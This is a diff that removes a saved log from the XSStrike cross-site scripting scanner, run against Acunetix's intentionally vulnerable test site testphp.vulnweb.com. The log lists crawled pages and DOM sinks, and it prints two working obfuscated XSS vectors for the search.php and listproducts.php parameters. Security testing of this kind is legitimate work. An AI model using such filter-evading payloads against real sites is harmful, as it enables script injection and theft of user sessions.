@@ -1,12 +1,0 @@
-
-	XSStrike v3.1.5
-
- Crawling the target 
- Parsing categories.php                            Parsing artists.php                               Parsing AJAX/index.php                            Parsing listproducts.php?cat=3                    Parsing listproducts.php?cat=1                    Parsing guestbook.php                             Parsing login.php                                 Parsing mailto:wvs@acunetix.com                   Parsing cart.php                                  Parsing userinfo.php                              Parsing listproducts.php?cat=2                    Parsing listproducts.php?cat=4                    Potentially vulnerable objects found at http://testphp.vulnweb.com/AJAX/index.php 
-------------------------------------------------------------
-14  		*cd.innerHTML* = inner;17  		*id.innerHTML* = '';44  		*id.innerHTML* = inner;77  			*xd.innerHTML* = httpreq.responseText;109 		*document.cookie* = "mycookie=3";------------------------------------------------------------
- Progress: 10/16 [++] Vulnerable webpage: http://testphp.vulnweb.com/search.php?test=query 
-[++] Vector for searchFor: <HTmL%0aonmouseovEr%0d=%0d(prompt)``%0dx> 
-[++] Vulnerable webpage: http://testphp.vulnweb.com/listproducts.php 
-[++] Vector for cat: <A/+/onMoUsEover%09=%09(prompt)``%0dx//v3dm0s 
- Progress: 16/16 
